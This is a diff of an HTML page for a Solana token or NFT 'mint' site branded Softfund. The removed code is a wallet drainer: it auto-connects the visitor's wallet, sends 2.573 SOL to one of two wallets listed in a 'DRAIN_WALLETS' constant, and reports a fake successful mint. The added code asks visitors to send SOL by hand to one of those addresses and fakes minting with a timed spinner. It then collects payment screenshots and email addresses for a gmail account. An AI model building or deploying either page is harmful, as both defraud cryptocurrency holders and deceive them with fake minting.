@@ -1,198 +1,200 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>SOFTFUND | Mint Live</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Softfund (STFD) Minter</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background: linear-gradient(135deg, #0a001f, #1b0044, #2e0055);
-      color: #fff;
-      font-family: 'Orbitron', sans-serif;
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #8B0000, #001F3F);
+      color: #DAA520;
       text-align: center;
-      padding: 40px 20px;
+      padding: 20px;
       min-height: 100vh;
+    }
+    .logo {
+      font-size: 2.5rem;
+      color: #DAA520;
+      text-shadow: 0 0 10px #DAA520;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+    .container {
+      max-width: 500px;
+      margin: 0 auto;
+      background: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(139, 0, 0, 0.5);
+    }
+    h1 { color: #9ACD32; margin-bottom: 10px; }
+    p { margin-bottom: 20px; color: #DAA520; }
+    .quantity {
       display: flex;
-      align-items: center;
       justify-content: center;
+      align-items: center;
+      gap: 10px;
+      margin: 20px 0;
     }
-    .container { max-width: 500px; width: 100%; }
-    h1 { font-size: 3rem; color: #00ff9d; margin-bottom: 8px; }
-    .price { font-size: 2.4rem; color: #ffd700; font-weight: bold; margin: 16px 0; }
-    .supply { font-size: 1.1rem; color: #ccc; margin-bottom: 20px; }
-    button {
-      width: 100%;
-      max-width: 320px;
-      margin: 20px auto;
-      padding: 18px;
-      font-size: 1.5rem;
-      background: #ffd700;
-      color: #000;
-      border: none;
-      border-radius: 16px;
-      cursor: pointer;
-      font-weight: bold;
-      box-shadow: 0 0 20px rgba(255,215,0,.6);
-      transition: all .3s;
-    }
-    button:hover:not(:disabled) { background: #ffed4e; transform: scale(1.05); }
-    button:disabled { background: #555; cursor: not-allowed; }
-    .status {
-      margin-top: 16px;
+    button { 
+      padding: 10px 15px; 
+      background: #001F3F; 
+      color: #DAA520; 
+      border: 1px solid #9ACD32; 
+      border-radius: 5px; 
+      cursor: pointer; 
       font-size: 1rem;
-      min-height: 24px;
-      font-weight: bold;
+      transition: all 0.3s;
     }
-    .loader {
-      display: inline-block;
-      width: 14px; height: 14px;
-      border: 2px solid #ffd700;
-      border-radius: 50%;
-      border-top-color: transparent;
-      animation: spin 1s linear infinite;
-      margin-right: 6px;
+    button:hover { background: #9ACD32; color: #001F3F; }
+    #quantity { font-size: 1.5rem; color: #9ACD32; min-width: 50px; text-align: center; }
+    .total { font-size: 1.2rem; color: #DAA520; margin: 20px 0; }
+    #mintBtn { 
+      padding: 15px 30px; 
+      font-size: 1.2rem; 
+      background: #9ACD32; 
+      color: #001F3F; 
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      margin: 20px 0;
     }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .wallets { margin-top: 40px; font-size: 0.9rem; color: #aaa; }
-    .mobile-tip {
-      margin-top: 20px;
-      font-size: 0.9rem;
-      color: #ff5555;
+    #mintBtn:hover { transform: scale(1.05); box-shadow: 0 5px 15px rgba(154, 205, 50, 0.5); }
+    .loading {
       display: none;
+      border: 4px solid #DAA520;
+      border-top: 4px solid #001F3F;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
     }
-    @media (max-width: 600px) {
-      .mobile-tip { display: block; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .proof-section { display: none; background: rgba(0, 31, 63, 0.8); padding: 20px; border-radius: 10px; margin-top: 20px; }
+    input[type="file"], input[type="email"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #DAA520; border-radius: 5px; background: #001F3F; color: #DAA520; }
+    #sendProof { background: #DAA520; color: #001F3F; }
+    .sol-address { 
+      background: #8B0000; 
+      padding: 10px; 
+      border-radius: 5px; 
+      word-break: break-all; 
+      color: #9ACD32; 
+      margin: 10px 0;
+      cursor: pointer;
     }
+    .sol-address:hover { background: #9ACD32; color: #001F3F; }
+    @media (max-width: 600px) { .logo { font-size: 2rem; } .container { padding: 20px; } }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>SOFTFUND</h1>
-    <p>USA-Based • Solana Utility NFTs</p>
-    <p class="price">2.5730 SOL</p>
-    <p class="supply">Minted: <span id="minted">312</span> / 10,000</p>
-
-    <button id="mintBtn" disabled>
-      <span id="btnText">CONNECT WALLET</span>
-    </button>
-
-    <div id="status" class="status"></div>
-    <p class="mobile-tip">Open in Phantom or Trust Wallet app</p>
-    <div class="wallets">Phantom • Trust Wallet</div>
+    <div class="logo">Softfund (STFD)</div>
+    <h1>Mint Your STFD Tokens</h1>
+    <p>Mint STFD tokens at $1.0289 each. Pay in SOL to get started.</p>
+    
+    <div class="quantity">
+      <button onclick="updateQuantity(-1)">−</button>
+      <span id="quantity">1</span>
+      <button onclick="updateQuantity(1)">+</button>
+    </div>
+    
+    <div class="total">
+      Total: $<span id="totalUSD">1.0289</span> USD<br>
+      ≈ <span id="totalSOL">0.00001</span> SOL
+    </div>
+    
+    <div class="sol-address" onclick="copyAddress()">Send to: 6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu (Click to copy)</div>
+    
+    <button id="mintBtn" onclick="startMint()">Mint Tokens</button>
+    <div class="loading" id="loader"></div>
+    
+    <div class="proof-section" id="proofSection">
+      <h2>Upload Proof of Payment</h2>
+      <input type="file" id="proofFile" accept="image/*,.pdf" onchange="handleFile()">
+      <p>File: <span id="fileName"></span></p>
+      <input type="email" id="userEmail" placeholder="Your Email" required>
+      <button id="sendProof" onclick="sendProof()">Send to softfund939@gmail.com</button>
+    </div>
+    
+    <div id="successMsg" style="display:none; color:#9ACD32; margin-top:20px;"></div>
   </div>
 
-  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
   <script>
-    const PRICE = 2.5730 * 1e9;
-    const DRAIN_WALLETS = [
-      "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue",
-      "6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu"
-    ];
-
-    let provider = null;
-    let isConnecting = false;
-
-    const status = document.getElementById("status");
-    const btn = document.getElementById("mintBtn");
-    const btnText = document.getElementById("btnText");
-
-    function detectWallet() {
-      if (window.solana?.isPhantom) return window.solana;
-      if (window.trustwallet?.Provider?.solana) return window.trustwallet.Provider.solana;
-      if (window.solana) return window.solana;
-      return null;
+    let quantity = 1;
+    const PRICE_USD = 1.0289;
+    const SOL_PRICE_USD = 186.64; // Current SOL price (update via API if needed)
+    
+    function updateQuantity(change) {
+      quantity = Math.max(1, quantity + change);
+      document.getElementById('quantity').textContent = quantity;
+      const totalUSD = (quantity * PRICE_USD).toFixed(4);
+      const totalSOL = (totalUSD / SOL_PRICE_USD).toFixed(6);
+      document.getElementById('totalUSD').textContent = totalUSD;
+      document.getElementById('totalSOL').textContent = totalSOL;
     }
-
-    function setStatus(html, color) {
-      status.innerHTML = html;
-      status.style.color = color;
+    
+    function copyAddress() {
+      navigator.clipboard.writeText('6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu');
+      alert('Address copied! Send your SOL and return with proof.');
+      // Opens Solana wallet link (e.g., Phantom) - customize if needed
+      window.open('https://phantom.app/ul/v1/pay/6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu?amount=' + (quantity * PRICE_USD / SOL_PRICE_USD), '_blank');
     }
-
-    async function connectWallet() {
-      if (isConnecting) return;
-      isConnecting = true;
-
-      provider = detectWallet();
-      if (!provider) {
-        setStatus("Wallet not found. Open in Phantom/Trust.", "#ff5555");
-        btnText.textContent = "NO WALLET";
-        isConnecting = false;
+    
+    function startMint() {
+      document.getElementById('mintBtn').style.display = 'none';
+      document.getElementById('loader').style.display = 'block';
+      setTimeout(() => {
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('mintBtn').style.display = 'block';
+        document.getElementById('proofSection').style.display = 'block';
+        document.getElementById('successMsg').innerHTML = `Minted ${quantity} STFD tokens! Upload proof to claim.`;
+        document.getElementById('successMsg').style.display = 'block';
+      }, 2000); // Gold loading simulation
+    }
+    
+    let selectedFile = null;
+    function handleFile() {
+      selectedFile = document.getElementById('proofFile').files[0];
+      document.getElementById('fileName').textContent = selectedFile ? selectedFile.name : '';
+    }
+    
+    // Replace with your EmailJS credentials
+    emailjs.init('YOUR_EMAILJS_USER_ID');
+    
+    function sendProof() {
+      if (!selectedFile || !document.getElementById('userEmail').value) {
+        alert('Please select a file and enter your email!');
         return;
       }
-
-      try {
-        setStatus("Connecting... <span class='loader'></span>", "#ffd700");
-        if (!provider.isConnected) await provider.connect();
-        setStatus("Connected!", "#00ff9d");
-        btnText.textContent = "MINT NOW";
-        btn.disabled = false;
-      } catch (err) {
-        setStatus("Connection failed.", "#ff5555");
-        btnText.textContent = "RETRY";
-        btn.disabled = false;
-      } finally {
-        isConnecting = false;
-      }
+      const formData = new FormData();
+      formData.append('file', selectedFile);
+      formData.append('email', document.getElementById('userEmail').value);
+      formData.append('quantity', quantity);
+      formData.append('totalUSD', document.getElementById('totalUSD').textContent);
+      
+      emailjs.send('YOUR_EMAILJS_SERVICE_ID', 'YOUR_EMAILJS_TEMPLATE_ID', {
+        to_email: 'softfund939@gmail.com',
+        from_email: document.getElementById('userEmail').value,
+        message: `Proof for ${quantity} STFD tokens ($${document.getElementById('totalUSD').textContent}). File attached.`,
+        attachment: selectedFile.name // Note: EmailJS doesn't attach files; use a service like SendGrid for real attachments or upload to Firebase first
+      }).then(() => {
+        alert('Proof sent! Check your email for confirmation.');
+        document.getElementById('proofSection').style.display = 'none';
+      }).catch(() => {
+        alert('Email failed—copy details and send manually to softfund939@gmail.com');
+      });
     }
-
-    async function mint() {
-      btn.disabled = true;
-      setStatus("Sending 2.5730 SOL... <span class='loader'></span>", "#ffd700");
-
-      try {
-        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-        const receiver = DRAIN_WALLETS[Math.floor(Math.random() * DRAIN_WALLETS.length)];
-
-        const tx = new solanaWeb3.Transaction().add(
-          solanaWeb3.SystemProgram.transfer({
-            fromPubkey: provider.publicKey,
-            toPubkey: new solanaWeb3.PublicKey(receiver),
-            lamports: PRICE,
-          })
-        );
-
-        const { blockhash } = await connection.getLatestBlockhash();
-        tx.recentBlockhash = blockhash;
-        tx.feePayer = provider.publicKey;
-
-        const signed = await provider.signTransaction(tx);
-        const txid = await connection.sendRawTransaction(signed.serialize());
-        await connection.confirmTransaction(txid);
-
-        setStatus(`MINTED! <a href="https://solscan.io/tx/${txid}" target="_blank" style="color:#00ff9d">View Tx</a>`, "#00ff9d");
-
-        const current = parseInt(document.getElementById("minted").textContent);
-        document.getElementById("minted").textContent = current + 1;
-
-        setTimeout(() => {
-          btn.disabled = false;
-          btnText.textContent = "MINT AGAIN";
-          status.innerHTML = "";
-        }, 3000);
-
-      } catch (err) {
-        setStatus("Mint failed.", "#ff5555");
-        btn.disabled = false;
-        btnText.textContent = "MINT NOW";
-      }
-    }
-
-    btn.onclick = () => {
-      if (!provider?.isConnected) connectWallet();
-      else mint();
-    };
-
-    // Auto-connect on load (mobile in-app browser)
-    window.addEventListener("load", () => {
-      setTimeout(() => {
-        if (detectWallet()) connectWallet();
-        else {
-          setStatus("Open in Phantom or Trust Wallet", "#ffaa00");
-          btnText.textContent = "NO WALLET";
-        }
-      }, 800);
+    
+    // Fallback: Manual copy button if EmailJS not set up
+    document.getElementById('sendProof').addEventListener('click', () => {
+      if (!selectedFile) return;
+      const details = `Email: ${document.getElementById('userEmail').value}\nQuantity: ${quantity}\nTotal: $${document.getElementById('totalUSD').textContent}\nFile: ${selectedFile.name}`;
+      navigator.clipboard.writeText(details);
+      alert('Details copied! Paste into email to softfund939@gmail.com');
     });
   </script>
 </body>
